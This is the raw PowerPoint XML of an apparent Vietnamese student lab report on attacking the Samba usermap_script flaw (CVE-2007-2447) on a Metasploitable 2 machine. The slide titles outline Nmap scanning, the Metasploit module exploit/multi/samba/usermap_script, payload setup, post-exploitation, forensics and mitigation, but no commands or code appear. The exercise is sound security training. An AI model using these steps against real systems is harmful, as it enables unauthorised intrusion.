              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>lỗ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hổng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CVE-2007-2447.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NVD+1</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Báo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vendor / </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>bản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thống</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> Linux </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>như</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> SUSE, Debian, Red Hat…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CERT Coordination Center+2SUSE+2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Module </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>khai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của</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> Metasploit — </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>minh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hoạ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khai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tế</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Rapid7+1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90377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771</TotalTime>
  <Words>1392</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>134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Unicode MS</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Celestial</vt:lpstr>
      <vt:lpstr>BÁO CÁO THỰC HÀNH TẤN CÔNG SAMBA USERMAP_SCRIPT (CVE-2007-2447)</vt:lpstr>
      <vt:lpstr>Giới thiệu về lỗ hổng bảo mật samba usermap script (cve-2007-2447)</vt:lpstr>
      <vt:lpstr>Giới thiệu về lỗ hổng bảo mật samba usermap script (cve-2007-2447)</vt:lpstr>
      <vt:lpstr>Giới thiệu về lỗ hổng bảo mật samba usermap script (cve-2007-2447)</vt:lpstr>
      <vt:lpstr>Tấn Công Lỗ Hổng Samba usermap_script (CVE-2007-2447)</vt:lpstr>
      <vt:lpstr>Tấn Công Lỗ Hổng Samba usermap_script (CVE-2007-2447)</vt:lpstr>
      <vt:lpstr>Thực hiện:</vt:lpstr>
      <vt:lpstr>Xác nhận Lỗ hổng: Trong kết quả Nmap, bạn sẽ thấy dịch vụ Samba đang chạy, thường là phiên bản 3.0.20 hoặc tương tự, phiên bản này đã bị ảnh hưởng bởi lỗ hổng usermap_script.</vt:lpstr>
      <vt:lpstr>Thiết lập Module Khai thác (Exploit Module)</vt:lpstr>
      <vt:lpstr>Chọn Module Khai thác: Bạn sẽ chọn module $exploit/multi/samba/usermap\_script$</vt:lpstr>
      <vt:lpstr>Cấu hình Mục tiêu và Payload</vt:lpstr>
      <vt:lpstr>Kiểm tra lại Cấu hình:</vt:lpstr>
      <vt:lpstr>Thực thi Tấn công (Exploitation)</vt:lpstr>
      <vt:lpstr>Thực hiện các lệnh Post-Exploitation: Bạn có thể chạy các lệnh cơ bản để thu thập thông tin và chứng minh việc chiếm quyền kiểm soát:</vt:lpstr>
      <vt:lpstr>Kiểm tra người dùng trên metasploiable 2 sau khi exploit:</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Phân tích pháp y, truy vết tấn công từ máy victim (metasploiable 2):</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Giải pháp và cách giảm thiểu</vt:lpstr>
      <vt:lpstr>Tham chiếu / Tài liệu chính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THỰC HÀNH TẤN CÔNG SAMBA USERMAP_SCRIPT (CVE-2007-2447)</dc:title>
  <dc:creator>trung nguyen</dc:creator>
  <cp:lastModifiedBy>trung nguyen</cp:lastModifiedBy>
  <cp:revision>61</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-12-09T07:14:47Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-12-10T05:12:56Z</dcterms:modified>
</cp:coreProperties>
</file>